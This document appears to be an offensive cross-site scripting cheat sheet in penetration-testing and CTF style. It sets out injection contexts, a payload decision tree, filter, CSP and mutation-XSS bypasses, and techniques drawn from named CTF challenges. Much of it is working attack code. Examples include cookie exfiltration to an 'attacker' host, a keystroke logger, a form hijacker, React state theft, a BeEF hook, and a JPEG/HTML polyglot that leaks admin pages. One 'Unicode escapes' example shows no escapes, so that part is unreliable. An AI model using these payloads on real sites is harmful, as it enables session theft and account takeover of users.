# Cross-Site Scripting

## Trigger
- User input reflected directly in HTML response body (search bars, error messages, redirect parameters)
- Stored content rendered for other users (comments, profile fields, image metadata, file upload names, forum posts, order notes)
- DOM sinks consuming URL fragments, search params, postMessage data, referrer, or window.name
- Admin bot context: blind XSS in backend dashboards, moderation panels, ticket systems, log viewers
- Content parser features: markdown renderers, wiki syntax, template engines, JSONP endpoints
- File upload with permissive MIME: JPEG/HTML polyglot, `.html` extension on file servers, `.js` username on CDN-cached profiles
- HTTP header reflection: X-Forwarded-For in log viewers, User-Agent in analytics dashboards, Referer in meta refresh tags
- CSS injection points: style attributes, `<style>` blocks, CSSOM manipulation from URL params
- Declarative JS frameworks: hyperscript (`_=`), Alpine.js (`x-data`), htmx (`hx-get`) attributes surviving sanitizers that strip `<script>` and event handlers

## Attack Surface
- **Reflection points**: search results, form field repopulation, error messages, redirect URLs
- **Stored content**: usernames, bios, comments, reviews, image metadata, file names, email bodies/titles, order notes
- **DOM sinks**: `innerHTML`, `outerHTML`, `document.write`, `eval`, `Function()`, `setTimeout(string)`, `setInterval(string)`, `insertAdjacentHTML`, `jQuery.html()`, `$(location.hash)`
- **DOM sources**: `location.hash`, `location.search`, `location.pathname`, `location.href`, `document.URL`, `document.documentURI`, `document.referrer`, `window.name`, `postMessage` data, `document.cookie`
- **Hidden DOM elements**: content in `display:none`, `visibility:hidden`, `opacity:0`, off-screen elements -- inspect with `document.querySelectorAll('[style*="display:none"],[hidden]')`
- **Client-Side Path Traversal (CSPT)**: frontend fetch/`$http` using unsanitized URL params to build resource paths: `fetch("/log/" + profileId)` abused via `?id=../admin/addAdmin`
- **CDN cache poisoning**: unkeyed headers (X-Forwarded-Host) cached with static-extension URL, serving authenticated attacker content as a globally shared static asset
- **React internal state**: `document.querySelector('[data-react-root]')` exposes `__reactInternalInstance$*` / `__reactFiber$*` properties containing component state (auth tokens, private data)
- **Auto-escaping gaps**: template engines with raw/unescape filters, markdown engines allowing arbitrary HTML attributes, JSONP callback parameters
- **JSONP endpoints**: `?callback=` parameters serving user-controlled function calls as `application/javascript`
- **Data URI contexts**: iframes with `data:text/html` or `srcdoc` bypassing origin checks in postMessage handlers

## Decision Tree
1. **Identify context** -- Where does the input land?
   - HTML tag context: between `<div>` and `</div>`, inside `<body>`? Try `<svg onload=alert(1)>`
   - HTML attribute context: inside `href="..."`, `class="..."`? Try `" onfocus=alert(1) autofocus "`
   - JavaScript string context: inside `<script>var x="..."</script>`? Try `";alert(1);//`
   - JS template literal: inside backticks? Try `${alert(1)}`
   - URL context: inside `href="..."`? Try `javascript:alert(1)`
   - CSS context: inside `<style>` or `style=`? Try `</style><script>alert(1)</script>`
   - JSONP callback: `?callback=myFunc`? Try `?callback=alert(1)`
2. **Select payload type** -- Based on context:
   - HTML: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `<details open ontoggle=alert(1)>`
   - Attribute: `" autofocus onfocus=alert(1) x="`, `" onclick=alert(1) "`
   - JS string: `';alert(1);//`, `\";alert(1);//`, `</script><script>alert(1)</script>`
   - URL: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`
   - CSS: `</style><script>alert(1)</script>`
3. **Test execution** -- Does alert/prompt/print fire? Check with `alert(document.domain)`
4. **If blocked, try bypass** -- Refer to Bypass section below by obstacle type:
   - Filter on tags/words? Try case variation, double-write, encoding
   - CSP blocking? Check for JSONP endpoints, CDN-hosted behavioral frameworks, missing base-uri, dangling markup
   - Length limit? Use external script load, short URL redirect
   - input normalization? Try Unicode folding, fullwidth characters, double encoding
5. **Confirm execution** -- Pop `alert(document.domain)`, verify DOM injection via headless browser, capture CSP violation report, confirm collaborator callback

## Techniques

### HTML Context
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<frameset onload=alert(1)>
<math><maction actiontype="statusline#http://127.0.0.1" xlink:href="javascript:alert(1)">click</maction></math>
```

### Attribute Context
```
" onfocus=alert(1) autofocus x="
" onclick=alert(1) "
" onmouseover=alert(1) "
"><script>alert(1)</script><"
'-alert(1)-'
\";alert(1);//
```

### JavaScript Context
```
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
${alert(1)}          // Template literal escape
```

### DOM Clobbering
```
<form id="config"><input name="canAdminVerify" value="1"></form>
<!-- Makes window.config.canAdminVerify truthy, bypassing access checks -->

<form id=x></form><form id=x><img src=x onerror=alert(1)></form>
<!-- Multiple elements with same id cause DOM clobbering -->
```

### CSS Context (Legacy IE)
```
<style>body{background:url("javascript:alert(1)")}</style>
<div style="x:expression(alert(1))">
```

### Stored XSS Vectors
- **Image metadata**: Upload JPEG with XSS payload in EXIF/IPTC fields
- **File upload names**: `foo.html` served as `text/html` when MIME detection is permissive
- **Username fields**: `<script src=http://xss.cc/x></script>` as display name
- **Email bodies**: HEY.com HTML sanitizer bypass for stored XSS in email rendering
- **CDN cache poisoning via `.js` username**: Register username ending in `.js`, profile page cached as static JS asset on CDN, self-XSS becomes wormable
- **Blind XSS hunter**: `<script src=http://your-xss-hunter.com/abc></script>` in comment/feedback forms

### DOM XSS Sinks
```javascript
// location.hash
http://target/page.html#<img src=x onerror=alert(1)>

// location.search
http://target/page.html?q=</script><script>alert(1)</script>

// postMessage
window.addEventListener("message", function(e){
  document.getElementById("output").innerHTML = e.data;
});
// Attack page:
targetWindow.postMessage("<img src=x onerror=alert(1)>", "*");

// jQuery $(location.hash)
// When jQuery's $() combined with hashchange event:
$(window).on('hashchange', function() {
  var element = $(location.hash);
  element[0].scrollIntoView();
});
// Exploit via iframe loading target with crafted hash:
<iframe src="http://vulnerable.com/#"
  onload="this.src+='<img src=x onerror=print()>'">
</iframe>

// Client-Side Path Traversal
fetch("/log/" + urlParams.get("id"), {method:"POST", body:data});
// Exploit: /user/profile?id=../admin/addAdmin

// jQuery CSS selector timing leak via hash
// $(location.hash) when hash is a CSS selector creates timing oracle
// http://target/#body[data-user-id^='a'] — measurable timing diff via image load
```

### CSS Exfiltration (Scriptless XSS)

**@font-face unicode-range (character SET leakage):**
```css
@font-face { font-family: exfil; src: url('http://attacker/leak?c=a'); unicode-range: U+0061; }
@font-face { font-family: exfil; src: url('http://attacker/leak?c=b'); unicode-range: U+0062; }
@font-face { font-family: exfil; src: url('http://attacker/leak?c=c'); unicode-range: U+0063; }
.target { font-family: exfil; }
```
Each font URL is requested only if the matching character exists in the target element. Leaks character SET but not order/position.

**Font glyph width + container query (order-aware exfiltration):**
Custom font assigns unique advance width per character. CSS container queries match width ranges to trigger background-image requests per character position.

**Dangling markup (HTML-only exfiltration):**
```html
<img src='http://attacker/steal?data=
```
Captures all subsequent HTML content until the next single quote character -- useful for CSRF tokens, page content.

### Unicode Tricks

**Case folding bypass (UNbreakable 2026 "demolition"):**
When server-side regex (Flask `<\s*/?\s*script`) is ASCII-only but a second layer (Go `strings.EqualFold`) applies Unicode case folding:
```html
<ſcript>location='http://attacker/?'+document.cookie</ſcript>
```
Characters: `ſ` (U+017F, Latin Long S) normalizes to `s` via Unicode case folding.

**Other folding pairs:**
- `ı` (U+0131) -> `i` / `I`
- `ﬁ` (U+FB01) -> `fi`
- `K` (U+212A, Kelvin sign) -> `k` / `K`

**Chrome URL normalization bypass (RCTF 2017):**
Fullwidth Latin characters (U+FF41-U+FF5A, U+FF0F, U+FF1A) normalize to ASCII in Chrome's URL processing:
```
http://eｘample.com/payload  ->  http://example.com/payload
```
Bypasses length checks and character filters on domain names.

**Unicode JS escapes:**
```
<script>alert(1)</script>
<script>\x61lert(1)</script>
<img src=x onerror=alert(1)>
```

### Polyglot XSS
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### JPEG+HTML Polyglot (EHAX 2026 "Metadata Meyham")
Create valid JPEG with HTML payload appended. Browsers parse HTML from trailing data when MIME allows:
```python
from PIL import Image
import io
img = Image.new('RGB', (1,1), color='red')
buf = io.BytesIO()
img.save(buf, 'JPEG', quality=1)
polyglot = buf.getvalue() + b'\n' + b'<script>fetch("/admin").then(r=>r.text()).then(t=>new Image().src="http://attacker/?"+t)</script>'
```

### Exploitation Payloads
```javascript
// Cookie exfiltration
new Image().src="http://attacker/?"+document.cookie
fetch("http://attacker/?"+document.cookie)
navigator.sendBeacon("http://attacker/?"+document.cookie)

// Full info gathering
new Image().src="http://attacker/?"+encodeURIComponent(document.cookie)
  +"&loc="+encodeURIComponent(location.href)
  +"&ua="+encodeURIComponent(navigator.userAgent)

// Keylogger
document.addEventListener("keypress", function(e){
  new Image().src="http://attacker/?"+e.key;
});

// Form submission hijack
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src="http://attacker/?"+new URLSearchParams(data).toString();
  });
});

// React component state extraction
const key = Object.keys(document.querySelector('[data-react-root]'))
  .find(k => k.startsWith('__reactInternalInstance$'));
const fiber = document.querySelector('[data-react-root]')[key];
const state = fiber.return.stateNode.state;
fetch('http://attacker/log?s='+encodeURIComponent(JSON.stringify(state)));

// BeEF hook
<script src="http://beef-server:3000/hook.js"></script>
```

### Admin Bot javascript: URL Bypass (DiceCTF 2026 "Mirror Temple")
When validation uses `new URL()` which accepts `javascript:` scheme:
```javascript
// Vulnerable:
try { new URL(targetUrl) } catch { process.exit(1) }
await page.goto(targetUrl, { waitUntil: "domcontentloaded" })

// Exploit: submit javascript: URL to report endpoint
url=javascript:fetch('/flag').then(r=>r.text()).then(f=>location='http://attacker/?'+f)
```
CSP does not protect against `javascript:` URLs in navigation context.

## Bypass

### Tag/Keyword Bypass
| Obstacle | Bypass |
|----------|--------|
| `<script>` blocked | `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`, `<details open ontoggle=alert(1)>`, `<marquee onstart=alert(1)>` |
| `script` keyword filtered | `<scr<script>ipt>` (double-write), `<sCrIpT>` (case variation), `<%73cript>` (encoding) |
| `alert` keyword filtered | `confirm(1)`, `prompt(1)`, `print()`, `top.alert(1)`, `window['al'+'ert'](1)`, `Function('alert(1)')()` |
| Quotes filtered | Use event handlers without quotes: `<img src=x onerror=alert(1)>`, template literals: `alert\`1\`` |
| Length limit | External script: `<script src=//short.url/x></script>`, use short redirection |
| Points/dots filtered | Decimal IP + bracket notation: `window["location"]="http://3221226004/"["concat"](document["cookie"])` |
| HTML entities in attribute | Works natively: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>` |

### CSP Bypass
| CSP Weakness | Technique |
|--------------|-----------|
| `'unsafe-inline'` | Direct `<script>alert(1)</script>` execution |
| `'unsafe-eval'` | `eval("alert(1)")`, `Function("alert(1)")()` |
| JSONP endpoint in whitelist | `<script src="http://whitelisted/jsonp?callback=alert(1)">` |
| AngularJS CDN allowed | `<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>` |
| Missing `base-uri` | `<base href="http://attacker/">` hijacks relative nonced script sources |
| Hyperscript/Alpine.js CDN allowed | `<script src="//cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script><div _="on load fetch '/api/ticket' then put document.cookie into its body"></div>` |
| Cloud platform domain whitelisted | Deploy malicious script to `*.cloudfunctions.net` or `*.run.app` |
| No script-src for prefetch | `<link rel="prefetch" href="http://attacker/?"+document.cookie>` |
| Dangling markup | `<img src='http://attacker/steal?data=` captures subsequent HTML |

### mXSS (Mutation XSS)
```html
<!-- noscript mutation -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- SVG CDATA mutation -->
<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>

<!-- MathML mutation -->
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

<!-- SVG nested -->
<svg><script>&#97;lert(1)</script></svg>
```

### Double Encoding
```
Server decodes once:   %3cscript%3e -> <script>
Server decodes twice:  %253cscript%253e -> %3cscript%3e -> <script>
```

### Null Origin postMessage Bypass (BackdoorCTF 2018)
When postMessage handler checks `event.origin` but allows null:
```html
<iframe src="data:text/html,<script>
  var w = window.open('http://target/page');
  setTimeout(function(){
    w.postMessage({type:'audio', details:{
      sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
    }, '*');
  }, 1000);
</script>"></iframe>
```

### Content-Type Bypass for script-src 'self' (Midnight Sun 2018)
When an endpoint reflects user input with attacker-chosen Content-Type under `script-src 'self'` and `X-Content-Type-Options: nosniff`:
```html
<script src="/xss?xss=function WELCOME(){};var oooooo=0;/*&mimis=jscript"></script>
<script src="/xss?xss=*/payload;//&mimis=jscript"></script>
```
The declared Content-Type overrides MIME protection; same-origin `script-src 'self'` allows loading.

## Verification
- **alert/prompt/confirm pop**: `alert(document.domain)` confirms JS execution
- **Headless browser verification**: Capture DOM snapshot after payload injection
- **CSP violation report**: Check browser console / report-uri endpoint for blocked executions
- **Outbound request to collaborator**: `new Image().src="http://your-server/?` + unique identifier
- **DOM inspection**: F12 Elements panel shows injected `<script>` or event handlers
- **Blind XSS**: Use XSS Hunter Express or self-hosted endpoint; check for callback from admin bot
- **Timing oracle**: Measure image load time for boolean-based exfiltration
- **PostMessage round-trip timing**: PBKDF2 prefix check timing differences measurable cross-origin

### Verifying Hidden DOM Content
```javascript
document.querySelectorAll('*').forEach(el => {
  const s = getComputedStyle(el);
  if (s.display==='none'||s.visibility==='hidden'||s.opacity==='0')
    if (el.textContent.trim()) console.log(el.tagName, el.id, el.textContent.trim());
});
```

### CVSS Scoring Reference
```
Stored XSS (admin panel)      = 6.1 - 8.0
Stored XSS (user-to-user)     = 6.1
Reflected XSS (no auth)       = 6.1
DOM XSS                       = 6.1
Blind XSS (admin triggers)    = 7.5 - 8.5
mXSS / email preview          = 6.5 - 8.1
```

## Pitfalls

- **Wrong context classification**: Distinguishing HTML context vs attribute context vs JS string context is critical. A payload that works in HTML (`<script>alert(1)</script>`) fails entirely when injected into an attribute value or JS string. Always determine the exact injection point before selecting payload.
- **CSP misreading**: CSP `script-src 'self'` does NOT block inline scripts unless `'unsafe-inline'` is absent -- old Chrome versions treated `'self'` as allowing inline. Check browser version CSP behavior. Missing `base-uri` is a bypass not an independent CSP weakness.
- **DOM-based XSS miss**: Many tests only check server-rendered reflection. DOM XSS exists entirely client-side: the payload never reaches the server. Test with `#<img src=x onerror=alert(1)>` in hash, and inspect client-side JS for sinks (innerHTML, eval, jQuery $()).
- **Same-origin vs cross-origin confusion**: `script-src 'self'` allows any same-origin resource. An attacker-controlled endpoint on the same origin (JSONP, upload parser, Content-Type reflection) can serve executable JS. Same-origin is not same-trust.
- **HttpOnly cookie overconfidence**: XSS cannot read HttpOnly cookies, but can still perform CSRF, keylogging, form hijacking, page content theft, and internal network scanning via WebRTC.
- **Sanitizer tunnel vision**: DOMPurify runs client-side but the backend may skip sanitization on "trusted" autosave endpoints. Always test direct API calls that bypass frontend sanitization.
- **Self-XSS dismissal**: Self-XSS becomes critical when combined with CDN cache poisoning (`.js` username) or CSRF (force victim to trigger their own stored XSS).
- **jQuery version matters**: Modern jQuery patches block `$(location.hash)` HTML injection, but older versions (pre-3.0) allow it. Iframe-triggered hashchange bypasses the need for user interaction.
- **AngularJS sandbox myth**: AngularJS sandbox (pre-1.6) was never a security boundary. Versions 1.6+ removed it entirely. Any cdn whitelist including angular.js enables expression injection.
- **XSSI vs XSS distinction**: XSSI (Cross-Site Script Inclusion) loads data from JSONP/script endpoints cross-origin without injecting into the victim page. It does not require an injection point -- just a `<script src>` tag pointing to a data-serving endpoint with callback parameter.
- **React state leakage**: Even without visible DOM reflection, XSS can read React Fiber internal properties (`__reactInternalInstance$*`) to extract component state, auth tokens, and server-fetched data never rendered in HTML.
- **CSS leaks are scriptless but data-limited**: `@font-face unicode-range` leaks character SET but not order or position. Combine with positional CSS tricks (::first-letter, text-indent + overflow) for ordering. Container queries + custom font glyph widths improve precision.
- **Character set matters**: Unicode encoding bypasses only work when the WAF/filter does ASCII-only matching. The same payload that bypasses a PHP/Laravel filter may be caught by a Go/Java filter that uses Unicode-normalized matching.
- **Decimal IP bypass caveat**: `http://3221226004/` resolves to `192.0.2.20` but the conversion changes per-octet. Calculate correctly: `o1*256^3 + o2*256^2 + o3*256 + o4`. Also, some browsers show the resolved IP in the address bar.
